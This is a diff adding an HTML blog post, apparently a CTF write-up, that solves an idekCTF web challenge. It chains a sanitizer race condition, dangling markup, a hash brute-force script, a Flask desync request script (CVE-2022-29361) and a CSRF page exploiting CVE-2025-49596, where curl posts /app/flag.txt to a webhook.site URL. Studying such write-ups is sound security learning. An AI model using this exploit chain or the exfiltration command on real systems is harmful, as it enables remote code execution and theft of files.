@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Web ctfs...</title>
+</head>
+<body>
+    <div class="center">
+        <a href="index.html">About me!</a>
+        <a href="https://github.com/wafbypasser/">Github</a>
+        <a href="posts.html">Posts</a>
+    </div>
+        <hr>
+    <div class="postslogic">
+        <img id="i1" src="/blog/pictures/idekctf.png">
+        <h1>Introduction!</h1>
+<p>It's time for yet another CTF this year!!!</p>
+
+<p>The key part of solving this challenge was to utilize CVE-2025-49596 and get an RCE on the server</p>
+
+<h2>Preparing</h2>
+<p>Such a complex challenge require some preparation, for example learning what mcp server is... so yeah i got some holes in my brain, but after some searching and digging i was able to incorporate that new obtained knowledge to BREAK that challenge apart</p>
+
+
+<h2>Inject... injecttttttttttttion</h2>
+<p>First things first, getting a succesful HTML injection is just the beggining. This challenged had CSP policies, various security header settings, and a self-implemented HTML Sanitizer Checker as methods to prevent me from getting enough sleep. This seemingly impossible to perform injection HTML protection technique have logic flaw. In sanitizer.py <span>def generate_key(self, session_id, user_id):
+    global sanitize_store
+    nonce = self.content[:128]
+    timestamp = int(time.time())
+    key = f"{session_id}:{user_id}:{nonce}:{timestamp}"
+    hash = hashlib.sha256(key.encode()).hexdigest()
+  
+    return hash
+  </span> this function uses the first 128 bytes of user messages as nonce and generates timestamp using the time.time method. Then it combines session_id and user_id to generate unique keys, then performs sha256 hash processing to generate hash. These generated keys are directly used in the sanitizer.check method. After generating unique keys, it checks whether those keys have already been sanitized in global objects. And if keys already exist, it uses values stored in global objects. I tried to duplicate the so called unique keys. Of course Race condition were used to do that.
+<ul>
+    <li>First i sent 129 bytes of clean text</li>
+    <li>Then wait around 0.4 seconds for sanitizer to check that text</li>
+    <li>Second request is sent containing 128 bytes of the same clean text and HTML injection at the end</li>
+</ul> <p>And that how simple HTML injection can be in redis cache</p></p>
+
+<h2>Now what?</h2>
+<p>After looking what further can i do with that injection, i saw that the server runs flask 2.1.0 which have Client Side Desync attack (CVE-2022-29361) and...forced redirection to other pages can be made to cause CSRF. The CSRF need to occur in bot container. Bot logic is defined - it logs in with admin account, and clicks #checkReport button in the user chat. But there's a catch, if 2 or more buttons with the same id are present, the bot will click the first one that rendered. Finding the report_id value is impossible. So here dangling markup injection comes to play... </span>
+</p>
+<h2>I dont have an idea for title, so i will call it Stage 2</h2>
+<p>The report function is needed, but it can be only used when we encounter error. <span>def stream_claude_response(app, session_id, user_id, content, parent_message_id, stream_channel):
+    with app.app_context():
+        ...
+
+        response = requests.post(
+            "https://api.anthropic.com/v1/messages",
+            headers=headers,
+            json=request_body,
+            stream=True
+        )
+
+        if not response.ok:
+            error_message = f"Claude API Error: HTTP {response.status_code}"
+
+            ...
+
+            redis.publish(stream_channel, json.dumps({
+                "event": "error",
+                "message": "Error streaming response",
+                "status_code": 500
+            }))
+
+            redis.set(f"session:{session_id}:{user_id}:report", json.dumps({
+                "event": "error",
+                "meta": json.loads(redis.get(stream_channel.replace('stream', 'meta'))),
+                "message_id": assistant_message_id,
+                "message": error_message
+            }))
+
+            redis.delete(stream_channel.replace('stream', 'meta'))
+            redis.delete(stream_channel)</span>
+        this above logic says, that details from errors are stored in report cache ONLY when responses directly returning errors from api.anthropic.com are recorded.
+    easiest way to force an error is to register incorrect token. So going back to dangling markup (which is intentionally injection of unclosed tag) during our HTML injection.
+Due to bundled user questions and LLM response, the HTML injection and dangling markup performed in user question will also absorb the LLM responses <strong>(pretty cool)</strong>.
+This is needed for precious report_id which is hidden in LLM response. When bot visits reported sessions, he then takes the error message and sends them to /admin/sessions/(session_id)/report 
+Users can view their own reports with <strong>GET</strong> request, but sadly for me, I cannot check original messages where reports were made and I can only check message_id.</p>
+<p>"I know that the message_id is derived by hashing the original message. Since I already know all the original message details, except for the 7-digit report_id, I can perform this approach to uncover the report_id:
+
+    <ul><li>
+        Set the Claude API token to deliberately incorrect values.
+    </li>
+    <li>
+    Trigger Dangling Markup Injection by exploiting HTML Injection.
+    </li>
+    <li>
+    Send these payloads to intentionally cause errors and collect error responses that arise from user interactions.
+    </li>
+    <li>
+    Use the report function to report the chat session.
+    </li>
+    <li>Access the <strong>/sessions/*session_id*/report</strong> endpoint to obtain the precious message_id</li>
+    <li>Brute force hash and find matching hash to my message_id</li>
+</ul>
+<p>Obtaining report_id script <span>import hashlib
+    import itertools
+    import time
+    from multiprocessing import Pool, cpu_count
+    
+    hash_to_find = "hash_here"
+    
+    html_template = """aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;input value="                                &lt;/div&gt;                            &lt;/div&gt;                        &lt;/div&gt;                    &lt;/div&gt;                &lt;/div&gt;                            &lt;div class=&quot;flex justify-start&quot;&gt;                    &lt;div class=&quot;flex max-w-[80%] flex-row items-start space-x-3&quot;&gt;                        &lt;div class=&quot;w-8 h-8 rounded-full flex items-center justify-center bg-claude-orange mr-3&quot;&gt;                            &lt;i class=&quot;fas fa-robot text-white text-sm&quot;&gt;&lt;/i&gt;                        &lt;/div&gt;                        &lt;div class=&quot;flex-1&quot;&gt;                            &lt;div class=&quot;bg-white border border-gray-200 rounded-2xl rounded-tl-md px-4 py-3&quot;&gt;                                &lt;div class=&quot;prose prose-sm max-w-none text-gray-800&quot;&gt;                                    &lt;div class=&quot;text-red-500&quot;&gt;                                            &lt;p&gt;                                                &lt;strong&gt;An error occurred.&lt;/strong&gt;                                                &lt;br&gt;                                                Claude API Error: HTTP 401 - invalid x-api-key                                            &lt;/p&gt;                                            &lt;br&gt;                                                                                        &lt;button id=&quot;checkReportBtn-{}&quot; class=&quot;bg-red-500 text-white px-4 py-2 rounded-md&quot;&gt;                                                Check Report {}                                            &lt;/button&gt;                                            &lt;br&gt;&lt;br&gt;                                            &lt;p class=&quot;text-sm&quot;&gt;                                                &lt;strong&gt;" you="" cannot="" send="" new="" messages="" until="" report.'&lt;="" strong=""&gt;                                            &lt;p&gt;&lt;/p&gt;"""
+    
+    html_template = html_template.replace('\n', '').replace('\r', '').replace('\t', '').replace('<', '&lt;').replace('>', '&gt;')
+    
+    
+    def find_hash_match(prefix_candidate):
+        candidate_str = html_template.format(prefix_candidate, prefix_candidate)
+        computed_hash = hashlib.sha256(candidate_str.encode()).hexdigest()
+        return computed_hash == hash_to_find, prefix_candidate
+    
+    
+    def generate_combinations(str_length=7):
+        chars = '0123456789abcdef'
+        for combo in itertools.product(chars, repeat=str_length):
+            yield ''.join(combo)
+    
+    
+    def process_chunk(start_idx, end_idx, char_set='0123456789abcdef'):
+        total = end_idx - start_idx
+        for idx, combo in enumerate(itertools.islice(itertools.product(char_set, repeat=7), start_idx, end_idx)):
+            if idx % 100000 == 0:
+                print(f"Progressing: {idx}/{total} ({(idx/total)*100:.2f}%)")
+    
+            prefix_candidate = ''.join(combo)
+            candidate_str = html_template.format(prefix_candidate, prefix_candidate)
+            computed_hash = hashlib.sha256(candidate_str.encode()).hexdigest()
+    
+            if computed_hash == hash_to_find:
+                return prefix_candidate
+        return None
+    
+    
+    def brute_force_with_multiprocessing():
+        start_time = time.time()
+    
+        total_possible_combinations = 16**7
+        num_of_processors = cpu_count()
+        task_size = total_possible_combinations // num_of_processors
+    
+        print(f"Possible combinations: {total_possible_combinations:,}")
+        print(f"Processors available: {num_of_processors}")
+        print(f"Task size per processor: {task_size:,}")
+    
+        with Pool(num_of_processors) as pool:
+            tasks = []
+            for idx in range(num_of_processors):
+                start_idx = idx * task_size
+                end_idx = start_idx + task_size if idx < num_of_processors - 1 else total_possible_combinations
+                tasks.append(pool.apply_async(process_chunk, (start_idx, end_idx)))
+    
+            for task in tasks:
+                result = task.get()
+                if result:
+                    elapsed_time = time.time() - start_time
+                    print("\nHash match found!")
+                    print(f"Prefix (7 characters): {result}")
+                    print(f"Time taken: {elapsed_time:.2f} seconds")
+    
+                    candidate_str = html_template.format(result, result)
+                    verified_hash = hashlib.sha256(candidate_str.encode()).hexdigest()
+                    print(f"Verified hash: {verified_hash}")
+                    print(f"Target hash: {hash_to_find}")
+                    print(f"Hashes match: {verified_hash == hash_to_find}")
+    
+                    pool.terminate()
+                    return result
+    
+        print("No hash match ")
+        return None
+    
+    
+    def single_threaded_brute_force():
+        start_time = time.time()
+        attempt_count = 0
+    
+        for prefix_candidate in generate_combinations(7):
+            attempt_count += 1
+            if attempt_count % 100000 == 0:
+                elapsed_time = time.time() - start_time
+                speed = attempt_count / elapsed_time
+                print(f"Progress: {attempt_count:,} / {16**7:,} ({(attempt_count/16**7)*100:.2f}%) - {speed:.0f} H/s")
+    
+            candidate_str = html_template.format(prefix_candidate, prefix_candidate)
+            computed_hash = hashlib.sha256(candidate_str.encode()).hexdigest()
+    
+            if computed_hash == hash_to_find:
+                elapsed_time = time.time() - start_time
+                print("\nHash match found!")
+                print(f"Prefix (7 characters): {prefix_candidate}")
+                print(f"Time taken: {elapsed_time:.2f} seconds")
+                print(f"Attempts made: {attempt_count:,}")
+                return prefix_candidate
+    
+        print("No hash match found.")
+        return None
+    
+    
+    if __name__ == "__main__":
+        print(f"Target hash: {hash_to_find}")
+    
+        result = brute_force_with_multiprocessing()
+    </span>
+
+So <strong>report_id </strong> is here, This what i needed for DOM Clobbering and finally to do CSRF</p>
+</p>
+<h2>Back to vulnerable Flask 2.1.0</h2>
+<p>if I for example intentionally send POST request that include body, server receive those requests and return 405 responses.
+By terminating responses without interpreting data delivered to body, unparsed body data remains in TCP packets. In this state, if new requests are performed, body data remaining in TCP packets overlaps with new request packets to create new requests.
+    In this process, new packets are overwritten by existing remaining packets and forcibly move to desired location.
+Wrapping things up, and the CSD payload is done <span>import requests
+    import time
+    import threading
+    
+    api_url = "https://ctfinder.instancer.idek.team"
+    
+    user = "user"
+    passwd = "password"
+    
+    report_identifier = "bla"
+    session_identifier = "blabla"
+    
+    with requests.Session() as session:
+        # Login request to authenticate user
+        login_response = session.post(api_url + "/auth/login", json={
+            "username": user,
+            "password": passwd
+        }, headers={
+            "Content-Type": "application/json"
+        }, allow_redirects=False)
+    
+        print(login_response.text)
+    
+        def send_message_part_1():
+            msg_response = session.post(api_url + f"/sessions/{session_identifier}/messages", json={
+                "content": "a" * 300
+            }, headers={
+                "Content-Type": "application/json"
+            })
+    
+            print(msg_response.text)
+    
+        def send_message_part_2():
+            # Small delay to simulate race condition
+            time.sleep(0.1)
+    
+            msg_response = session.post(api_url + f"/sessions/{session_identifier}/messages", json={
+                "content": "a" * 250 + f"""(form action='/' method='POST' enctype='text/plain'>(textarea name='GET http://heymom.com HTTP/1.1\r\nX-Header: X'>(/textarea>(input type='submit' id='checkReportBtn-{report_identifier}' value='Submit'></form>"""
+            }, headers={
+                "Content-Type": "application/json"
+            })
+    
+            print(msg_response.text)
+    
+        # Starting threads to send both requests concurrently
+        threading.Thread(target=send_message_part_1).start()
+        threading.Thread(target=send_message_part_2).start()
+    
+        print("Done")
+    </span>
+But in order to this attack work I still need to build a website with CSRF... <span>
+    import flask
+
+app = flask.Flask(__name__)
+
+@app.route('/', methods=['GET'])
+def index():
+    print("connected!")
+
+    return """
+    (html>
+    (body>
+        (script>
+        (async () => {
+            try {
+                const exploitUrl = `http://localhost:6277/sse?transportType=stdio&command=curl&args=-X%20POST%20https%3A%2F%2Fwebhook.site%2F91bf6de3-4315-4710-82af-2d56452bc99b%20--data%20%22%40%2Fapp%2Fflag.txt%22`;
+
+                await fetch(exploitUrl, {
+                    "headers": {
+                        "accept": "*/*",
+                        "accept-language": "en-US,en;q=0.9",
+                        "cache-control": "no-cache",
+                        "pragma": "no-cache"
+                    },
+                    "referrer": "http://127.0.0.1:6274/",
+                    "referrerPolicy": "strict-origin-when-cross-origin",
+                    "body": null,
+                    "method": "GET",
+                    "mode": "no-cors",
+                    "credentials": "omit"
+                });
+
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                console.log("Exploit sent successfully");
+            } catch (error) {
+                console.error("Exploit failed:", error);
+            }
+        })()
+        (/script>
+    (/body>
+    (/html>
+    """
+
+app.run(debug=True, host='0.0.0.0', port=1000)
+
+</span></p>
+<h2>The END</h2>
+<p>So i managed to solve the challenge after the Idek2025, I just didn't had enough time for that, so instead I tried to pwn this after the competition. After all it was worth it, plenty of things learned, and the most important <strong>I enjoyed it</strong>.</p>
+</div>
+
+</body>
+</html>
